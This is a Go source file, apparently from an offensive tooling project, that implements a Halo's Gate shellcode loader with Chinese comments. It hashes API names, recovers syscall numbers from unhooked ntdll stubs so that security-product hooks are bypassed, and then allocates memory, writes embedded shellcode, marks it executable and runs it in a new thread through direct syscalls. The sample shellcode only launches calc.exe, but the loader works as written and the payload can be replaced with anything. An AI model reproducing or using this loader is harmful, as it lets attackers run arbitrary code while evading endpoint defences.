/*
Copyright © 2022 p1d3er

*/
package main

import (
	Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

/**
光环之门，hash调用，sysid
地狱之门的一个补丁，并不是所有函数都被hook住。利用旁边未被hook的函数算出sysid然后重建id进行脱钩
https://blog.sektor7.net/#!res/2021/halosgate.md
*/

//str2sha1
//04262a7943514ab931287729e862ca663d81f515 -  NtAllocateVirtualMemory
//681e778499375c2fb42da094ca5119ae773c189b -  WaitForSingleObject

//Sha256Hex
//a6290493ec0ae72f94b5e4507d63420e40d5e35404d99a583a62acfedddfd848 - NtProtectVirtualMemory
//a3b64f7ca1ef6588607eac4add97fd5dfbb9639175d4012038fc50984c035bcd - NtCreateThreadEx
func main() {

	//sc, _ := hex.DecodeString("31c0506863616c635459504092741551648b722f8b760c8b760cad8b308b7e18b250eb1ab2604829d465488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7")
	sc := []byte{
		//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
		0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
		0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
		0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
		0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
		0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
		0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
		0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
		0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
		0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
		0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
		0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
		0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
		0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
		0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
		0xd7,
	}
	var thisThread = uintptr(0xffffffffffffffff)
	//从内存加载，得到sysid
	alloc, e := Go2gabh.MemHgate("04262a7943514ab931287729e862ca663d81f515", str2sha1)
	if e != nil {
		panic(e)
	}
	//从磁盘加载
	protect, e := Go2gabh.DiskHgate("a6290493ec0ae72f94b5e4507d63420e40d5e35404d99a583a62acfedddfd848", Sha256Hex)
	if e != nil {
		panic(e)
	}
	createthread, e := Go2gabh.MemHgate("a3b64f7ca1ef6588607eac4add97fd5dfbb9639175d4012038fc50984c035bcd", Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWaitForSingleObject, _, e := Go2gabh.MemFuncPtr("kernel32.dll", "681e778499375c2fb42da094ca5119ae773c189b", str2sha1)
	if e != nil {
		panic(e)
	}
	createThread(sc, thisThread, alloc, protect, createthread, pWaitForSingleObject)
}

func createThread(sc []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(sc))
	r1, r := Go2gabh.HgSyscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//copy shellcode
	memcpy(baseA, sc)

	var oldprotect uintptr
	r1, r = Go2gabh.HgSyscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = Go2gabh.HgSyscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, handle, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}
func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
